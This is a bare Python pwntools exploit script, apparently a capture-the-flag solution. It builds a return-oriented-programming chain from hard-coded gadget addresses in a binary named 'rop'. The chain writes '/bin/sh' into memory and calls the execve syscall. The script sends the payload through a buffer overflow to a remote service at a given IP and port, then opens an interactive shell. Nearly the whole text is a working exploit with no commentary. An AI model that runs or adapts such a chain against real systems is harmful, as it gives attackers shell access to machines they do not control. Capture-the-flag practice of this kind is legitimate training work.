from pwn import *

# 0x00000000004014f6 : pop rdi ; ret
pop_rdi = 0x4014f6
# 0x000000000044f6cc : pop rax ; ret
pop_rax = 0x44f6cc
# 0x0000000000416a40 : mov rax, rdi ; ret
mov_rax_rdi = 0x416a40
# 0x000000000047b104 : mov qword ptr [rax], rdi ; pop rbx ; ret
mov_ptrrax_rdi = 0x47b104
# 0x0000000000442a19 : pop rdx ; pop rsi ; ret
pop_rdx_pop_rsi = 0x442a19
# 0x00000000004003da : syscall
syscall = 0x4003da

r = process('rop')
r = remote('140.110.112.77', 2113)
raw_input('debug:')
r.recvuntil('skill.')

payload = p64(pop_rdi) + p64(0x6cd000)
payload += p64(mov_rax_rdi)
payload += p64(pop_rdi) + '/bin/sh\0'
payload += p64(mov_ptrrax_rdi) + 'a' * 8
payload += p64(pop_rdi) + p64(0x6cd000)
payload += p64(pop_rdx_pop_rsi) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

r.sendline('a' * 15 + '\0' + 'a' * 24 + payload)
r.interactive()
